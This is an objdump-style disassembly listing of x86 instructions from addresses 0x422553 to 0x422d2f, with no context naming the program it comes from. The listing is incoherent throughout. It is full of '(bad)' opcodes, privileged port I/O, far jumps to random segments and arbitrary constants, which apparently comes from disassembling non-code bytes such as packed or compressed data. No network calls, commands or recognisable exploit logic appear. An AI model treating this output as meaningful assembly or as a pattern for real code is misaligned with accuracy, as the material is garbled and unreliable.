  422553:	fs jecxz 0x422576
  422556:	(bad)  
  422559:	mul    edx
  42255b:	imul   edx,DWORD PTR [ecx+0x16f8da17],0xffffffa3
  422562:	mov    dh,0x58
  422564:	dec    ecx
  422565:	xchg   BYTE PTR [edx],ah
  422567:	sub    ebx,DWORD PTR [edx]
  422569:	mov    esp,DWORD PTR [ebx-0x5e]
  42256c:	shr    DWORD PTR [ecx+0x37],0x6
  422570:	imul   ecx,DWORD PTR [esi],0xfffffff5
  422573:	dec    edx
  422574:	ja     0x4225be
  422576:	in     eax,dx
  422577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422578:	scas   al,BYTE PTR es:[edi]
  422579:	mov    bl,bh
  42257b:	retf   0xce8b
  42257e:	loope  0x422531
  422580:	shl    BYTE PTR [edi-0x3fd4c819],1
  422586:	loope  0x422588
  422588:	sub    BYTE PTR [eax],0xa8
  42258b:	lods   al,BYTE PTR ds:[esi]
  42258c:	pop    es
  42258d:	pop    ss
  42258e:	mov    al,ds:0xd88fbe04
  422593:	mov    al,ds:0x7a994265
  422598:	sbb    DWORD PTR [ecx+ebx*8-0x29],ebx
  42259c:	scas   al,BYTE PTR es:[edi]
  42259d:	repnz cdq 
  42259f:	pop    ds
  4225a0:	sysret 
  4225a2:	cmp    BYTE PTR [ebp+0x7384a720],dl
  4225a8:	shl    BYTE PTR [edi-0x58],0xd0
  4225ac:	mov    eax,ds:0xe2ed41e5
  4225b1:	jo     0x422573
  4225b3:	ins    DWORD PTR es:[edi],dx
  4225b4:	push   edx
  4225b5:	aas    
  4225b6:	mov    ecx,0xb2eda9e4
  4225bb:	rcl    BYTE PTR [ebx-0xb34c5d8],1
  4225c1:	cwde   
  4225c2:	(bad)  
  4225c4:	mov    ch,0x5c
  4225c6:	call   0xe9f7b12
  4225cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225cc:	sub    DWORD PTR [edi+0x9a],esi
	...
  4225da:	leave  
  4225db:	xchg   esi,eax
  4225dc:	ins    DWORD PTR es:[edi],dx
  4225dd:	mov    dh,0x7f
  4225df:	(bad)  
  4225e0:	(bad)  
  4225e2:	out    0x3f,al
  4225e4:	nop
  4225e5:	sbb    esp,DWORD PTR [esp+eax*1]
  4225e8:	mov    cl,bh
  4225ea:	(bad)  [eax+0x1fd0001]
  4225f0:	add    BYTE PTR [eax],al
  4225f2:	pop    esp
  4225f3:	add    BYTE PTR [ebp+0x5d38700e],dl
  4225f9:	jl     0x42261e
  4225fb:	or     DWORD PTR [ecx+0x112f25d7],edi
  422601:	sbb    ecx,esp
  422603:	fwait
  422604:	push   0xf9102f11
  422609:	clc    
  42260a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42260b:	into   
  42260c:	(bad)  
  42260d:	jmp    0x67fd:0xeb6bd77b
  422614:	xchg   edx,eax
  422615:	jg     0x4225b9
  422617:	shr    DWORD PTR [esi+0x2ad22674],1
  42261d:	sti    
  42261e:	(bad)  
  422620:	out    dx,eax
  422621:	loope  0x4225ec
  422623:	xchg   ebx,eax
  422624:	ret    0xba37
  422627:	add    al,0xf1
  422629:	dec    ebp
  42262a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42262b:	cmp    bh,BYTE PTR [edx]
  42262d:	(bad)  
  42262f:	xchg   edx,edi
  422631:	sub    BYTE PTR [edi],dl
  422633:	scas   eax,DWORD PTR es:[edi]
  422634:	inc    edi
  422635:	js     0x42261e
  422637:	push   ss
  422638:	mov    ebx,0x2030e2d2
  42263d:	pop    ds
  42263e:	mov    ebx,0xb44c340a
  422643:	add    bl,BYTE PTR [eax+0x4e5a2f72]
  422649:	add    ch,BYTE PTR [edi-0x144485cc]
  42264f:	cmp    al,BYTE PTR [ecx]
  422651:	repz add esi,esi
  422654:	ret    
  422655:	cs (bad) 
  422657:	rcr    DWORD PTR [ecx],1
  422659:	pop    edx
  42265a:	imul   ebx,DWORD PTR [ebx+0x75b7ac38],0x1b806902
  422664:	jp     0x4226c2
  422666:	sbb    al,0x19
  422668:	aad    0xc6
  42266a:	out    dx,al
  42266b:	lods   al,BYTE PTR ds:[esi]
  42266c:	push   0xffffffba
  42266e:	mov    ebp,0xf88e2f2c
  422673:	mov    dl,0x49
  422675:	fst    QWORD PTR [edi]
  422677:	ins    BYTE PTR es:[edi],dx
  422678:	inc    esi
  422679:	popf   
  42267a:	fisub  WORD PTR [edx+0x354f9612]
  422680:	repnz mov ebx,0x6f6c7b00
  422686:	loope  0x4226ad
  422688:	pop    esi
  422689:	sub    cl,bh
  42268b:	push   eax
  42268c:	outs   dx,BYTE PTR ds:[esi]
  42268d:	inc    esi
  42268e:	pushf  
  42268f:	pusha  
  422690:	cmp    BYTE PTR [ebp-0x31dc4fa2],ah
  422696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422697:	cdq    
  422698:	or     ebx,DWORD PTR [bx-0x4fbe]
  42269d:	shl    BYTE PTR [edi+0x4fd63cc3],0x7a
  4226a4:	or     al,BYTE PTR [ebx]
  4226a6:	add    DWORD PTR [ecx+0x18f1cb64],ebp
  4226ac:	sub    edx,DWORD PTR ds:0xebdeadbe
  4226b2:	or     eax,eax
  4226b4:	and    esp,DWORD PTR [edi+edx*1]
  4226b7:	add    dh,BYTE PTR [ebx]
  4226b9:	ror    DWORD PTR [edx+edi*2+0x5b],0x4b
  4226be:	jae    0x4226d2
  4226c0:	div    cl
  4226c2:	(bad)  
  4226c3:	ins    BYTE PTR es:[edi],dx
  4226c4:	pop    ebx
  4226c5:	lds    edi,FWORD PTR [ebp+eax*2-0x76be15bb]
  4226cc:	hlt    
  4226cd:	mov    ebp,0xedc6e1b
  4226d2:	pop    es
  4226d3:	jnp    0x422671
  4226d5:	call   0x97e3af27
  4226da:	ret    
  4226db:	and    DWORD PTR [eax-0x7ab6ac77],ebx
  4226e1:	and    DWORD PTR [ebp+0x55],0xfffffff0
  4226e5:	popf   
  4226e6:	or     ecx,ebp
  4226e8:	aas    
  4226e9:	mov    eax,0xffc19c6a
  4226ee:	adc    ebp,DWORD PTR [ecx+0x23bdf0d2]
  4226f4:	adc    al,0xf4
  4226f6:	sbb    eax,0x9654a778
  4226fb:	inc    esi
  4226fc:	sbb    eax,0x3f1f68cc
  422701:	add    eax,0xbaa82735
  422706:	ja     0x4226b0
  422708:	add    al,0x5c
  42270a:	mov    BYTE PTR [edx-0x78700e17],ch
  422710:	scas   eax,DWORD PTR es:[edi]
  422711:	xor    DWORD PTR ds:[esi-0x5d],edi
  422715:	push   ebx
  422716:	call   0xb9308dd8
  42271b:	jb     0x422719
  42271d:	mov    edi,0xc28a3575
  422722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422723:	xchg   esp,eax
  422724:	xor    eax,0x1af9cc64
  422729:	and    BYTE PTR [eax],al
  42272b:	jle    0x42273c
  42272d:	xlat   BYTE PTR ds:[ebx]
  42272e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42272f:	or     al,0x4b
  422731:	and    DWORD PTR [esi-0xd],ebx
  422734:	push   ebx
  422735:	out    dx,al
  422736:	push   esi
  422737:	pop    ebp
  422738:	push   ebx
  422739:	xlat   BYTE PTR ds:[ebx]
  42273a:	(bad)  
  42273b:	dec    ebx
  42273c:	aam    0xc9
  42273e:	pusha  
  42273f:	int3   
  422740:	inc    eax
  422741:	es call 0x5362:0x42ced14
  422749:	js     0x42276b
  42274b:	mov    eax,ds:0x773b9e6a
  422750:	adc    al,0x54
  422752:	mul    edx
  422754:	test   BYTE PTR [ebx+0x77],dh
  422757:	es clc 
  422759:	data16 (bad) 
  42275b:	cmp    edi,DWORD PTR [ebx+esi*8-0x71dfb7db]
  422762:	int3   
  422763:	push   es
  422764:	repnz popf 
  422766:	inc    esi
  422767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422768:	or     cl,BYTE PTR [ebx]
  42276a:	mov    ds:0xa94da950,al
  42276f:	add    edi,edi
  422771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422772:	fidiv  WORD PTR [esp+esi*2+0x1f]
  422776:	sti    
  422777:	rcl    BYTE PTR [ecx-0x68e6f12],1
  42277d:	in     al,0x6b
  42277f:	cwde   
  422780:	sti    
  422781:	out    dx,eax
  422782:	mov    ch,0xe9
  422784:	pop    esp
  422785:	jo     0x422799
  422787:	xor    edx,DWORD PTR [eax]
  422789:	inc    eax
  42278a:	mov    ds:0xd691c89,eax
  42278f:	dec    ecx
  422790:	out    dx,eax
  422791:	and    al,0xea
  422793:	data16 ins BYTE PTR es:[edi],dx
  422795:	mov    al,ds:0x9f8e3b94
  42279a:	aaa    
  42279b:	xchg   esi,eax
  42279c:	sub    BYTE PTR [edx+0x5d],ch
  42279f:	ins    BYTE PTR es:[edi],dx
  4227a0:	inc    esp
  4227a1:	sbb    DWORD PTR [edx-0x6],edi
  4227a4:	jl     0x4227d5
  4227a6:	add    eax,0x222932ef
  4227ab:	push   esi
  4227ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227ad:	push   ss
  4227ae:	jbe    0x422742
  4227b0:	es dec ecx
  4227b2:	xor    esi,DWORD PTR [ecx]
  4227b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227b5:	add    al,0x2d
  4227b7:	aad    0x9e
  4227b9:	pop    ss
  4227ba:	repnz pop esi
  4227bc:	(bad)  
  4227bd:	sub    edx,DWORD PTR [ebp-0x5f]
  4227c0:	and    al,0xfe
  4227c2:	je     0x42276a
  4227c4:	xchg   ebp,eax
  4227c5:	jae    0x42274f
  4227c7:	ds xor ebp,0xe754d96f
  4227ce:	mov    WORD PTR [edx+0x668941ab],fs
  4227d4:	popf   
  4227d5:	nop
  4227d6:	pusha  
  4227d7:	jmp    0x4227ea
  4227d9:	imul   esp,DWORD PTR [eax+0x5],0x44
  4227dd:	sub    al,0x83
  4227df:	(bad)  
  4227e0:	cmp    eax,0x7c0c7abb
  4227e5:	inc    edx
  4227e6:	xor    BYTE PTR [esi],0xe0
  4227e9:	test   al,0x19
  4227eb:	mov    al,ds:0x2bb60c
	...
  4227f8:	add    BYTE PTR [eax],al
  4227fa:	dec    eax
  4227fb:	out    dx,eax
  4227fc:	ja     0x422869
  4227fe:	idiv   ebx
  422800:	pop    esp
  422801:	out    dx,eax
  422802:	cmp    DWORD PTR [ecx-0xd251df0],ebx
  422808:	ins    DWORD PTR es:[edi],dx
  422809:	sub    eax,ebx
  42280b:	mov    ds:0x1fd0001,al
  422810:	add    BYTE PTR [eax],al
  422812:	mov    cl,0x54
  422814:	or     ah,bl
  422816:	ds pop ss
  422818:	sbb    al,0x94
  42281a:	push   0x1aaaa2dd
  42281f:	mov    eax,ds:0x89c2b162
  422824:	iret   
  422825:	mov    bl,0xcc
  422827:	aad    0x58
  422829:	call   0xbcffc07e
  42282e:	rol    DWORD PTR ds:[edi-0x4675cebd],1
  422835:	shl    BYTE PTR [ebx-0x815a708],cl
  42283b:	(bad)  
  42283c:	out    dx,eax
  42283d:	adc    edx,DWORD PTR [esi]
  42283f:	add    DWORD PTR [ebx-0x318ed868],ecx
  422845:	fisttp WORD PTR [ecx]
  422847:	jmp    FWORD PTR [esi+0x4d]
  42284a:	xchg   ebp,eax
  42284b:	cwde   
  42284c:	pop    esi
  42284d:	push   ebx
  42284e:	add    DWORD PTR [edi],0x37c2ceb6
  422854:	js     0x4228bd
  422856:	mov    ah,0xe9
  422858:	push   0x9d852237
  42285d:	xchg   esi,eax
  42285e:	dec    ecx
  42285f:	and    eax,0xa791167a
  422864:	mov    eax,0x1ab31812
  422869:	mov    ds:0x5f8f0350,al
  42286e:	ror    DWORD PTR [eax+esi*8],1
  422871:	ret    0x4832
  422874:	push   esp
  422875:	cmp    ecx,DWORD PTR [edx]
  422877:	mov    dl,0x58
  422879:	leave  
  42287a:	mov    edx,DWORD PTR [eax]
  42287c:	in     al,0x86
  42287e:	or     ebx,DWORD PTR [edi-0x3a]
  422881:	in     al,dx
  422882:	or     BYTE PTR [eax+0x259805e6],al
  422888:	int    0x49
  42288a:	xor    ecx,DWORD PTR [edi+ebx*2+0x3]
  42288e:	(bad)  
  42288f:	loopne 0x42282f
  422891:	mov    dl,0xd7
  422893:	pop    esi
  422894:	shr    DWORD PTR [eax+edx*2-0x25],0xce
  422899:	sahf   
  42289a:	dec    ebp
  42289b:	sbb    al,0x62
  42289d:	mul    BYTE PTR [esi+0x1d]
  4228a0:	cmp    al,0xde
  4228a2:	loop   0x422878
  4228a4:	popf   
  4228a5:	stc    
  4228a6:	sbb    edi,DWORD PTR [edi+edx*4+0x1d]
  4228aa:	or     cl,BYTE PTR [ebx]
  4228ac:	mov    ch,0xc3
  4228ae:	rcl    ecx,1
  4228b0:	(bad)  
  4228b2:	jbe    0x422893
  4228b4:	repz ja 0x422931
  4228b7:	xchg   ecx,eax
  4228b8:	sbb    BYTE PTR [ebp+0xe73a58c],cl
  4228be:	adc    al,0x44
  4228c0:	ret    
  4228c1:	fimul  WORD PTR [edx-0x617fde05]
  4228c7:	lock jb 0x422884
  4228ca:	or     eax,0x756aa0dd
  4228cf:	dec    edi
  4228d0:	add    DWORD PTR [edx],eax
  4228d2:	icebp  
  4228d3:	mov    cl,0x85
  4228d5:	(bad)  
  4228d6:	mov    eax,0xd0fc53b0
  4228db:	fwait
  4228dc:	push   esp
  4228dd:	add    ebx,DWORD PTR [esi+0x1b085ff]
  4228e3:	sub    BYTE PTR [esi-0x77],ch
  4228e6:	addr16 mov bl,0x83
  4228e9:	xchg   edi,eax
  4228ea:	int    0x82
  4228ec:	out    0xe2,al
  4228ee:	fisttp DWORD PTR [edi+0x21]
  4228f1:	cmp    DWORD PTR cs:[ebp-0x21],esi
  4228f5:	in     al,dx
  4228f6:	mov    ah,0xae
  4228f8:	je     0x422955
  4228fa:	sbb    BYTE PTR [edi+eax*2+0x13],ah
  4228fe:	jmp    0x2994:0x7eae211b
  422905:	outs   dx,BYTE PTR ds:[esi]
  422906:	pop    bx
  422908:	mov    esi,eax
  42290a:	fwait
  42290b:	test   al,0x84
  42290d:	in     al,0x8b
  42290f:	xchg   esi,eax
  422910:	add    dl,BYTE PTR [ecx]
  422912:	js     0x4228cb
  422914:	cli    
  422915:	mov    dh,BYTE PTR [edx]
  422917:	jg     0x4228c9
  422919:	mov    ebx,0x899936a6
  42291e:	daa    
  42291f:	out    dx,eax
  422920:	ret    
  422921:	test   eax,0x5539d810
  422926:	or     al,0xb3
  422928:	mov    bl,0x7e
  42292a:	out    0xc9,eax
  42292c:	mov    WORD PTR [ecx],cs
  42292e:	or     ecx,DWORD PTR [edi-0x2b]
  422931:	outs   dx,BYTE PTR ds:[esi]
  422932:	adc    eax,0x283ff2dc
  422937:	xor    eax,0x2397c73d
  42293c:	icebp  
  42293d:	mov    edi,0x8328645b
  422942:	mov    WORD PTR [ebx-0x38],?
  422945:	push   esi
  422946:	and    bl,BYTE PTR [ecx-0x78847178]
  42294c:	dec    ebp
  42294d:	fstp   QWORD PTR [edi]
  42294f:	or     edx,DWORD PTR ds:0xb0493a4c
  422955:	xor    al,0xe3
  422957:	ins    BYTE PTR es:[edi],dx
  422958:	fldcw  WORD PTR [ebx+0x7ca07871]
  42295e:	jb     0x4229ac
  422960:	and    esi,edx
  422962:	test   eax,0xaf005423
  422967:	call   0x6efeced7
  42296c:	popa   
  42296d:	xchg   ecx,eax
  42296e:	stos   BYTE PTR es:[edi],al
  42296f:	addr16 addr16 into 
  422972:	pop    ss
  422973:	sub    BYTE PTR [edi-0x177fc432],0x90
  42297a:	inc    ecx
  42297b:	add    eax,0x824251bf
  422980:	add    ebx,DWORD PTR [ebx]
  422982:	das    
  422983:	lods   eax,DWORD PTR ds:[esi]
  422984:	int    0xec
  422986:	cmp    al,0xb5
  422988:	sub    eax,0xbe8e182a
  42298d:	or     eax,0x32d8a473
  422992:	mov    esp,0xdb4603fe
  422997:	sbb    DWORD PTR [ebx-0x2bbebe1c],ebp
  42299d:	sub    ch,BYTE PTR [esi-0x33]
  4229a0:	sbb    al,BYTE PTR [ebx-0x5f2efd9e]
  4229a6:	mov    esi,0x77e02a5e
  4229ab:	fnstcw WORD PTR [ecx+0x4d]
  4229ae:	sbb    eax,0x566150e
  4229b3:	icebp  
  4229b4:	aaa    
  4229b5:	mov    eax,0x24804143
  4229ba:	sub    bh,BYTE PTR ds:0x2679d30a
  4229c0:	jmp    0x75a9:0xc807003b
  4229c7:	mov    edx,0x582770f6
  4229cc:	je     0x422977
  4229ce:	jmp    0x21a:0x250f3a16
  4229d5:	and    esp,DWORD PTR [ecx+0x4bca32c8]
  4229db:	js     0x4229f0
  4229dd:	mov    ah,0xbe
  4229df:	sbb    ebp,DWORD PTR ds:0xc3a19f35
  4229e5:	jmp    0x6cdc8058
  4229ea:	push   ds
  4229eb:	(bad)  
  4229ec:	fisttp DWORD PTR [edx]
  4229ee:	(bad)  
  4229ef:	(bad)  
  4229f0:	adc    esp,DWORD PTR [eax-0x7e473c83]
  4229f6:	je     0x18b52979
  4229fc:	inc    ecx
  4229fd:	fisttp QWORD PTR [ebx+0x4c3c44fa]
  422a03:	cli    
  422a04:	cmp    edi,DWORD PTR [ebx]
  422a06:	cli    
  422a07:	jge    0x422a35
  422a09:	jle    0x422a5a
  422a0b:	mov    DWORD PTR [edi-0x47],esp
  422a0e:	pop    ebp
	...
  422a17:	add    BYTE PTR [eax],al
  422a19:	add    BYTE PTR [eax+0x5be35ae3],dh
  422a1f:	sti    
  422a20:	mov    ecx,0xeb2b3af3
  422a25:	inc    ecx
  422a26:	bound  ebp,QWORD PTR [ebp+edi*4+0x1a4d59c]
  422a2d:	add    ch,bh
  422a2f:	add    DWORD PTR [eax],eax
  422a31:	add    BYTE PTR [ecx-0x39],cl
  422a34:	sti    
  422a35:	lahf   
  422a36:	and    dl,bh
  422a38:	mov    ds:0x29588cb,eax
  422a3d:	sub    al,0x4b
  422a3f:	loope  0x422a33
  422a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a42:	iret   
  422a43:	sbb    BYTE PTR [ebx-0x3a2e8795],ch
  422a49:	scas   al,BYTE PTR es:[edi]
  422a4a:	retf   0x4b68
  422a4d:	outs   dx,DWORD PTR ds:[esi]
  422a4e:	loope  0x422aa0
  422a50:	adc    BYTE PTR [eax+0x63],al
  422a53:	js     0x422a0e
  422a55:	dec    eax
  422a56:	ins    BYTE PTR es:[edi],dx
  422a57:	sti    
  422a58:	and    ah,dl
  422a5a:	jmp    0x422a56
  422a5c:	sbb    ebx,ecx
  422a5e:	lahf   
  422a5f:	pop    ecx
  422a60:	push   ebp
  422a61:	mov    esp,0x4117e1a
  422a66:	push   esp
  422a67:	jmp    0xfa3974c
  422a6c:	scas   al,BYTE PTR es:[edi]
  422a6d:	pop    esp
  422a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a6f:	mov    eax,ds:0xab83b5f8
  422a74:	test   eax,0xed52d5c1
  422a79:	rol    DWORD PTR [edi+0xcb96d04],0x41
  422a80:	push   esi
  422a81:	sbb    al,0x56
  422a83:	push   ds
  422a84:	jmp    0x422a62
  422a86:	(bad)  
  422a87:	idiv   DWORD PTR [eax-0x23]
  422a8a:	mov    eax,0x68a2357c
  422a8f:	xor    al,0xa8
  422a91:	mov    edi,0x2c02158
  422a96:	data16 outs dx,BYTE PTR ds:[esi]
  422a98:	xchg   edx,eax
  422a99:	repnz fld DWORD PTR [eax]
  422a9c:	(bad)  
  422a9d:	cld    
  422a9e:	out    dx,eax
  422a9f:	ss push eax
  422aa1:	mov    eax,0x1b631340
  422aa6:	sub    ebx,DWORD PTR [edx+eax*8]
  422aa9:	enter  0xaede,0x5e
  422aad:	sar    BYTE PTR [ebx+0x2d],1
  422ab0:	pop    edx
  422ab1:	adc    bh,dh
  422ab3:	push   edx
  422ab4:	dec    ebx
  422ab5:	jbe    0x422abd
  422ab7:	sahf   
  422ab8:	enter  0x1e1,0xab
  422abc:	popa   
  422abd:	add    DWORD PTR [eax],esi
  422abf:	push   0x840119b1
  422ac4:	inc    ebp
  422ac5:	xor    al,0x1b
  422ac7:	mov    ds,edi
  422ac9:	sets   BYTE PTR [ecx-0x1d]
  422acd:	add    DWORD PTR [edi-0x4],eax
  422ad0:	mov    esi,0x517ff4bc
  422ad5:	jmp    0x422afd
  422ad7:	je     0x422a6c
  422ad9:	and    eax,0xee8493a8
  422ade:	(bad)  
  422adf:	fcmovb st,st(3)
  422ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ae2:	or     eax,0x271f8fba
  422ae7:	sti    
  422ae8:	push   0x56
  422aea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422aeb:	ins    BYTE PTR es:[edi],dx
  422aec:	jmp    0x39ea3445
  422af1:	add    dh,BYTE PTR [eax+0x37a32847]
  422af7:	lock lahf 
  422af9:	xchg   esi,eax
  422afa:	xchg   esi,eax
  422afb:	push   0xe0bcf682
  422b00:	add    DWORD PTR [edi],0x19
  422b03:	mov    cs,edi
  422b05:	in     eax,0x6a
  422b07:	out    dx,eax
  422b08:	(bad)  
  422b09:	rcl    BYTE PTR [eax-0x6],cl
  422b0c:	loopne 0x422b09
  422b0e:	cmp    eax,0x33470431
  422b13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b14:	push   esp
  422b15:	hlt    
  422b16:	fcomp  DWORD PTR [edx-0x6f87dc4b]
  422b1c:	test   al,0x1c
  422b1e:	repnz fbld TBYTE PTR cs:[eax]
  422b22:	mov    esi,0xba295f87
  422b27:	mov    ebx,0xb8351949
  422b2c:	push   ebx
  422b2d:	or     ah,0x42
  422b30:	jno    0x422acb
  422b32:	pop    esp
  422b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b34:	inc    edi
  422b35:	cdq    
  422b36:	jmp    0x422b8d
  422b38:	enter  0x8345,0xfb
  422b3c:	sub    al,0x5b
  422b3e:	mov    ds:0xe095a6cb,eax
  422b43:	stos   DWORD PTR es:[edi],eax
  422b44:	adc    eax,0xc6bd8e75
  422b49:	and    BYTE PTR [eax-0x62b8a097],0x65
  422b50:	leave  
  422b51:	aaa    
  422b52:	sbb    ch,dh
  422b54:	scas   eax,DWORD PTR es:[edi]
  422b55:	push   eax
  422b56:	push   ebp
  422b57:	loop   0x422b2f
  422b59:	jp     0x422b6a
  422b5b:	test   esi,ecx
  422b5d:	cwde   
  422b5e:	std    
  422b5f:	mov    ebp,0xb30ae7b3
  422b64:	je     0x422af7
  422b66:	std    
  422b67:	and    esi,DWORD PTR ds:0xc17bfc04
  422b6d:	imul   DWORD PTR [ecx]
  422b6f:	mov    edi,ebx
  422b71:	retf   0x33d5
  422b74:	sbb    ah,BYTE PTR [esi+esi*4]
  422b77:	popa   
  422b78:	mov    edi,0x925e66e1
  422b7d:	stc    
  422b7e:	mov    ah,ch
  422b80:	(bad)  
  422b81:	repnz es in al,dx
  422b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b85:	aad    0x6
  422b87:	lock mov esi,0x948f0c64
  422b8d:	push   ebx
  422b8e:	adc    esp,ebx
  422b90:	sub    BYTE PTR [esi],bl
  422b92:	mov    dl,0xb1
  422b94:	mov    ch,0xd8
  422b96:	imul   eax,esp,0xffffff83
  422b99:	add    ebx,DWORD PTR [eax]
  422b9b:	mov    esp,DWORD PTR [edx-0x414a550a]
  422ba1:	adc    al,0x3c
  422ba3:	sar    ch,0x63
  422ba6:	jmp    0x422bfb
  422ba8:	sub    bl,BYTE PTR [eax]
  422baa:	mov    DWORD PTR [edx],esi
  422bac:	push   esi
  422bad:	out    dx,al
  422bae:	mov    esp,0x6e466963
  422bb3:	fimul  DWORD PTR [ecx+edi*4-0x4]
  422bb7:	xchg   ebx,eax
  422bb8:	adc    DWORD PTR [edi],edx
  422bba:	mov    ecx,0x8497f322
  422bbf:	retf   0xc51d
  422bc2:	sub    bh,BYTE PTR [edx-0x1a39b957]
  422bc8:	push   esp
  422bc9:	pop    ebp
  422bca:	and    eax,0x42321977
  422bcf:	jne    0x422c4a
  422bd1:	pop    esp
  422bd2:	ins    DWORD PTR es:[edi],dx
  422bd3:	jne    0x422c50
  422bd5:	and    eax,0x63cd9a5b
  422bda:	test   DWORD PTR ds:[eax+0x1a658a94],0x19ad7319
  422be5:	add    cl,cl
  422be7:	hlt    
  422be8:	or     al,0x2d
  422bea:	mov    al,ds:0xbfaf0657
  422bef:	int3   
  422bf0:	mov    bh,0x9b
  422bf2:	in     eax,0x68
  422bf4:	and    al,al
  422bf6:	dec    edx
  422bf7:	add    DWORD PTR [edi+0x61],0xffffffbd
  422bfb:	push   ecx
  422bfc:	cli    
  422bfd:	lock cmp DWORD PTR [eax],eax
  422c00:	outs   dx,DWORD PTR ds:[esi]
  422c01:	dec    edi
  422c02:	jl     0x422c7e
  422c04:	add    DWORD PTR [ebx],edi
  422c06:	cs xor dl,ah
  422c09:	daa    
  422c0a:	sub    cl,ch
  422c0c:	pop    ds
  422c0d:	xchg   ebp,eax
  422c0e:	and    BYTE PTR [ecx],dh
  422c10:	jnp    0x422c50
  422c12:	fist   WORD PTR [esi-0x4ae7a831]
  422c18:	ret    0xb54e
  422c1b:	jecxz  0x422c21
  422c1d:	imul   esp,ebx,0xffffffa7
  422c20:	xchg   ecx,eax
  422c21:	loopne 0x422bce
  422c23:	xchg   ecx,eax
  422c24:	mov    eax,0xad503c97
  422c29:	inc    edx
  422c2a:	ins    DWORD PTR es:[edi],dx
  422c2b:	pushf  
  422c2c:	lea    edx,[eax+0xba]
	...
  422c3a:	xor    eax,0xbf06168e
  422c3f:	sahf   
  422c40:	xor    eax,0x913f27bf
  422c45:	sub    esi,DWORD PTR [esi]
  422c47:	int    0xdc
  422c49:	mov    bh,0xd2
  422c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c4c:	add    DWORD PTR [eax],eax
  422c4e:	std    
  422c4f:	add    DWORD PTR [eax],eax
  422c51:	add    BYTE PTR ds:0xd6b2c871,ch
  422c57:	aad    0x80
  422c59:	add    bl,BYTE PTR [esi+0x8]
  422c5c:	and    edx,DWORD PTR [edx]
  422c5e:	iret   
  422c5f:	shl    DWORD PTR [esi+ebx*1-0x3b5c1aef],cl
  422c66:	adc    eax,0xbef6fedf
  422c6b:	int3   
  422c6c:	fisubr WORD PTR [edi-0x6f6a3620]
  422c72:	scas   al,BYTE PTR es:[edi]
  422c73:	aas    
  422c74:	les    edx,FWORD PTR [ecx+0x7182cb90]
  422c7a:	mov    eax,ds:0x8c9b7940
  422c7f:	dec    ebp
  422c80:	pop    ebp
  422c81:	mov    esp,0x6e74a57f
  422c86:	add    edx,DWORD PTR [ebx+0x1c358c4e]
  422c8c:	adc    DWORD PTR [ebx],edi
  422c8e:	mov    bh,0xa8
  422c90:	sub    dh,ch
  422c92:	std    
  422c93:	inc    ebp
  422c94:	inc    edi
  422c95:	jae    0x422c26
  422c97:	gs jbe 0x422c9f
  422c9a:	xchg   edx,eax
  422c9b:	sahf   
  422c9c:	test   DWORD PTR [eax+0x655b4f9e],edi
  422ca2:	jecxz  0x422c67
  422ca4:	jae    0x422caa
  422ca6:	mov    al,ds:0x720d976b
  422cab:	dec    eax
  422cac:	mov    bl,0x86
  422cae:	leave  
  422caf:	cmp    DWORD PTR [edi],edx
  422cb1:	pop    es
  422cb2:	adc    edx,DWORD PTR cs:[ebx-0x9]
  422cb6:	jl     0x422d06
  422cb8:	fsub   DWORD PTR [esi+0x43]
  422cbb:	mov    dl,0x17
  422cbd:	mov    bl,0xae
  422cbf:	xchg   ebp,eax
  422cc0:	sar    BYTE PTR [eax+ecx*2+0x33],0x79
  422cc5:	xchg   edi,eax
  422cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cc7:	adc    BYTE PTR [esi+0x42],0x71
  422ccb:	mov    al,0x7b
  422ccd:	mov    al,ds:0x309764fd
  422cd2:	pusha  
  422cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cd4:	pop    esi
  422cd5:	sub    DWORD PTR [ecx+0x7a],ecx
  422cd8:	mov    edi,0xf8727d29
  422cdd:	sahf   
  422cde:	or     ecx,edx
  422ce0:	cld    
  422ce1:	push   eax
  422ce2:	es pop ecx
  422ce4:	sub    ebp,DWORD PTR [ecx+0xb]
  422ce7:	les    ebx,FWORD PTR [eax]
  422ce9:	add    bh,cl
  422ceb:	test   BYTE PTR [edx],0x38
  422cee:	nop
  422cef:	pop    ss
  422cf0:	inc    BYTE PTR [esi-0x36]
  422cf3:	int    0xb2
  422cf5:	xor    DWORD PTR [eax+0x6f942c7f],ebp
  422cfb:	iret   
  422cfc:	cwde   
  422cfd:	mov    dh,0xa0
  422cff:	addr16 cli 
  422d01:	aas    
  422d02:	dec    esp
  422d03:	loop   0x422cb1
  422d05:	out    dx,eax
  422d06:	xor    ah,BYTE PTR [edi+0x6bd0a9d7]
  422d0c:	(bad)  
  422d0e:	enter  0x4131,0x12
  422d12:	xchg   esi,eax
  422d13:	mov    edi,0xfc59d3e9
  422d18:	hlt    
  422d19:	xor    al,0xe3
  422d1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d1c:	dec    ebx
  422d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d1e:	dec    ecx
  422d1f:	add    BYTE PTR [ebx],bl
  422d21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d22:	jo     0x422cef
  422d24:	mov    esi,0xf46cd10e
  422d29:	arpl   WORD PTR ds:0xd870d656,sp
  422d2f:	fnsave [ebx+ecx*4+0x30]
